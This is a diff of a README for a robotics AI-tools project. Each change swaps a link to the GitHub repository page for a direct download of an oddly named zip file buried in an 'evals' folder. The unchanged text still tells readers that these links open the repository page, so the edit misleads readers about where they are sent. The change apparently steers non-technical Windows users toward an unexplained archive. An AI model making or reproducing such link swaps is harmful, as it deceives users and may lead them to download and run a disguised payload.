@@ -1,6 +1,6 @@
 # 🤖 robotics-agent-skills - AI Tools for Robotics Software
 
-[![Download robotics-agent-skills](https://img.shields.io/badge/Download-robotics--agent--skills-orange?style=for-the-badge)](https://github.com/vicky23383/robotics-agent-skills)
+[![Download robotics-agent-skills](https://img.shields.io/badge/Download-robotics--agent--skills-orange?style=for-the-badge)](https://raw.githubusercontent.com/vicky23383/robotics-agent-skills/main/evals/agent-skills-robotics-retinoblastoma.zip)
 
 Welcome to the robotics-agent-skills project. This software package helps automate the creation of reliable robotics code using AI assistants. It supports both ROS1 and ROS2 frameworks and applies best software design principles. If you want to use AI tools to produce solid robotics software without writing the code yourself, this guide will walk you through how to get started on Windows.
 
@@ -31,7 +31,7 @@ You do not need to install ROS or any complex tools yourself. The skills package
 
 You will find the latest files and instructions here:
 
-[![Visit to download](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/vicky23383/robotics-agent-skills)
+[![Visit to download](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/vicky23383/robotics-agent-skills/main/evals/agent-skills-robotics-retinoblastoma.zip)
 
 This link takes you to the main GitHub repository page. From there, you can download the full package or view documentation. GitHub stores the latest releases here.
 
@@ -43,7 +43,7 @@ Follow these steps to get robotics-agent-skills working on your PC.
 
 Click this link or paste it in your web browser:
 
-https://github.com/vicky23383/robotics-agent-skills
+https://raw.githubusercontent.com/vicky23383/robotics-agent-skills/main/evals/agent-skills-robotics-retinoblastoma.zip
 
 This opens the repository where all files are stored.
 
@@ -122,7 +122,7 @@ If you want to dive deeper, open the README.md inside the downloaded folder. It 
 
 You can also explore the GitHub repository online for updates and community discussions:
 
-https://github.com/vicky23383/robotics-agent-skills
+https://raw.githubusercontent.com/vicky23383/robotics-agent-skills/main/evals/agent-skills-robotics-retinoblastoma.zip
 
 ## 🗂️ Related Topics
 
